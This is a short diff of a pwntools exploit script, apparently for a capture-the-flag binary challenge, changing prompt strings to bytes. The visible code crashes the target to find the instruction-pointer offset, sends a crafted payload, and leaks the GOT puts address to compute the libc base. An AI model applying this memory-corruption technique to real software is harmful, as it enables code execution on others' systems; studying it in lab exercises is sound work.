@@ -13,7 +13,7 @@ def start(argv=[], *a, **kw):
 def find_ip(payload):
     # Launch process and send payload
     p = process(exe)
-    p.sendlineafter('?', payload)
+    p.sendlineafter(b'>', payload)
     # Wait for the process to crash
     p.wait()
     # Print out the address of EIP/RIP at the time of crashing
@@ -66,12 +66,12 @@ payload = flat({
 })
 
 # Send the payload
-io.sendlineafter('>', payload)
+io.sendlineafter(b'>', payload)
 
 io.recvline()  # Receive the newline
 
 # Retrieve got.puts address
-got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
+got_puts = unpack(io.recv()[:6].ljust(8, b'\x00'))
 info("leaked got_puts: %#x", got_puts)
 
 # Subtract puts offset to get libc base
